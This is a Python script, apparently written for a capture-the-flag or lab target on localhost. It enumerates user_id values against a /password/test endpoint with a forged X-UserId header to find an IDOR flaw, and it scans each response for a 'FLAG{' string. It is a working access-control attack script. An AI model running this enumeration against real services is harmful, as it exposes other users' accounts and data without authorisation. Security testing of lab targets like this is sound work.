#!/usr/bin/env python3
"""
Systematic fuzzing script for IDOR testing on /password/test endpoint
Tests user_id parameter in ranges 1-1000 and 10025-10100
"""

import requests
import json
import time

# Configuration
BASE_URL = "http://127.0.0.1:33200"
ENDPOINT = "/password/test"
VALID_USER_ID = "10032"  # From reconnaissance

# Setup session with authentication
session = requests.Session()
headers = {
    "X-UserId": VALID_USER_ID,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Security-Testing-Agent"
}

# Test ranges
ranges = [
    (1, 1000, "low_range"),
    (10025, 10100, "high_range")
]

# Results storage
valid_ids = []
suspicious_responses = []
flag_found = None

print("=" * 60)
print("ID FUZZING CAMPAIGN - /password/test")
print("=" * 60)
print(f"Target: {BASE_URL}{ENDPOINT}")
print(f"Auth Header: X-UserId: {VALID_USER_ID}")
print(f"Testing ranges: 1-1000, 10025-10100")
print("=" * 60)

# Get baseline response with valid user_id
print("\n[+] Getting baseline response with valid user_id=10032...")
try:
    baseline_data = {"user_id": VALID_USER_ID}
    baseline_response = session.post(
        f"{BASE_URL}{ENDPOINT}",
        headers=headers,
        data=baseline_data,
        timeout=10
    )
    baseline_status = baseline_response.status_code
    baseline_length = len(baseline_response.text)
    print(f"[+] Baseline: Status={baseline_status}, Length={baseline_length}")
except Exception as e:
    print(f"[-] Baseline request failed: {e}")
    baseline_status = 0
    baseline_length = 0

# Fuzz user_id parameter
print("\n[+] Starting fuzzing campaign...")
total_tested = 0

for start, end, range_name in ranges:
    print(f"\n{'='*60}")
    print(f"Testing range: {start}-{end} ({range_name})")
    print(f"{'='*60}")
    
    for user_id in range(start, end + 1):
        total_tested += 1
        
        try:
            # Prepare POST data
            data = {"user_id": str(user_id)}
            
            # Send request
            response = session.post(
                f"{BASE_URL}{ENDPOINT}",
                headers=headers,
                data=data,
                timeout=5
            )
            
            status_code = response.status_code
            response_text = response.text
            response_length = len(response_text)
            
            # Check for FLAG pattern
            if "FLAG{" in response_text:
                flag_start = response_text.find("FLAG{")
                flag_end = response_text.find("}", flag_start)
                if flag_end > flag_start:
                    flag_content = response_text[flag_start:flag_end+1]
                    print(f"\n{'!'*60}")
                    print(f"FLAG FOUND with user_id={user_id}!")
                    print(f"Flag: {flag_content}")
                    print(f"{'!'*60}")
                    flag_found = {
                        "user_id": user_id,
                        "flag": flag_content,
                        "status_code": status_code,
                        "length": response_length
                    }
            
            # Identify valid IDs based on response differences
            # Valid IDs typically return 200 OK or different content
            if status_code == 200 and response_length > 100:
                content_diff = abs(response_length - baseline_length) > 50
                
                if content_diff or user_id == int(VALID_USER_ID):
                    valid_ids.append({
                        "user_id": user_id,
                        "status_code": status_code,
                        "length": response_length,
                        "diff_from_baseline": response_length - baseline_length
                    })
                    
                    # Show interesting responses (not just our own user)
                    if user_id != int(VALID_USER_ID):
                        print(f"[+] Valid ID found: {user_id}")
                        print(f"    Status: {status_code}, Length: {response_length}, Diff: {response_length-baseline_length}")
            
            # Also flag any non-403/404 responses as potentially valid
            elif status_code not in [403, 404, 400]:
                suspicious_responses.append({
                    "user_id": user_id,
                    "status_code": status_code,
                    "length": response_length,
                    "snippet": response_text[:200]
                })
                print(f"[?] Suspicious response for ID {user_id}: Status={status_code}")
            
            # Progress indicator
            if user_id % 100 == 0:
                print(f"    Progress: Tested {total_tested} IDs...")
            
            # Rate limiting - be gentle
            time.sleep(0.05)
            
        except requests.exceptions.Timeout:
            print(f"[-] Timeout for user_id={user_id}")
            continue
        except Exception as e:
            print(f"[-] Error for user_id={user_id}: {e}")
            continue

# Results summary
print("\n" + "=" * 60)
print("FUZZING CAMPAIGN COMPLETE")
print("=" * 60)
print(f"Total IDs tested: {total_tested}")
print(f"Valid IDs found: {len(valid_ids)}")
print(f"Suspicious responses: {len(suspicious_responses)}")

if flag_found:
    print("\n" + "=" * 60)
    print("FLAG FOUND!")
    print("=" * 60)
    print(f"User ID: {flag_found['user_id']}")
    print(f"Flag: {flag_found['flag']}")
else:
    print("\n[+] No flag found in this campaign")

if valid_ids:
    print("\n" + "=" * 60)
    print("VALID USER IDs DISCOVERED:")
    print("=" * 60)
    for entry in valid_ids:
        if entry['user_id'] != int(VALID_USER_ID):
            print(f"  - ID {entry['user_id']}: Status={entry['status_code']}, Length={entry['length']}")

if suspicious_responses:
    print("\n" + "=" * 60)
    print("SUSPICIOUS RESPONSES (non-403/404):")
    print("=" * 60)
    for entry in suspicious_responses:
        print(f"  - ID {entry['user_id']}: Status={entry['status_code']}")

# Save detailed results
results = {
    "flag_found": flag_found,
    "valid_ids": valid_ids,
    "suspicious_responses": suspicious_responses,
    "total_tested": total_tested,
    "baseline": {
        "status": baseline_status,
        "length": baseline_length
    }
}

print("\n" + "=" * 60)
print(json.dumps(results, indent=2))
print("=" * 60)
